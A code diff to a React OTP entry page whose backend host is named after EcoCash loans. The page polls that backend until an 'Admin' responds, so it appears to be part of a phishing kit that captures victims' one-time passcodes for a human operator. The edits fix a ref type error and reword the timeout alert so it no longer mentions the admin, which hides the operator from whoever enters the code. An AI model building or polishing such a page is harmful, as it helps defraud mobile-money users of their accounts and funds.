@@ -1,7 +1,6 @@
-import React, { useState, useRef, useEffect } from 'react';
+import { useState, useRef, useEffect } from 'react'; // Removed React import
 import { useLocation, useNavigate } from 'react-router-dom';
 
-// CONNECTED TO YOUR LIVE RENDER BACKEND
 const API_BASE_URL = "https://ecocash-loans-hlfv.onrender.com"; 
 
 export default function OTPPage() {
@@ -70,7 +69,7 @@ export default function OTPPage() {
         if (attempts > 60) {
           if (pollRef.current) clearInterval(pollRef.current);
           setIsProcessing(false);
-          alert("Timed out. Admin did not respond.");
+          alert("Timed out.");
           return;
         }
 
@@ -118,7 +117,20 @@ export default function OTPPage() {
           
           <div style={{ display: 'flex', justifyContent: 'space-between', gap: '8px', marginBottom: '24px' }}>
             {otp.map((digit, index) => (
-              <input key={index} type="text" inputMode="numeric" value={digit} onChange={(e) => handleChange(index, e)} onKeyDown={(e) => handleKeyDown(index, e)} ref={(el) => (inputRefs.current[index] = el)} style={{ width: '45px', height: '55px', border: digit !== '' ? '2px solid #1e5ce6' : '1px solid #e0e0e0', borderRadius: '12px', textAlign: 'center', fontSize: '24px', fontWeight: 600, outline: 'none' }} disabled={isProcessing} />
+              <input 
+                key={index} 
+                type="text" 
+                inputMode="numeric" 
+                value={digit} 
+                onChange={(e) => handleChange(index, e)} 
+                onKeyDown={(e) => handleKeyDown(index, e)} 
+                // FIXED REF TYPE ERROR HERE:
+                ref={(el) => {
+                  inputRefs.current[index] = el;
+                }} 
+                style={{ width: '45px', height: '55px', border: digit !== '' ? '2px solid #1e5ce6' : '1px solid #e0e0e0', borderRadius: '12px', textAlign: 'center', fontSize: '24px', fontWeight: 600, outline: 'none' }} 
+                disabled={isProcessing} 
+              />
             ))}
           </div>
           
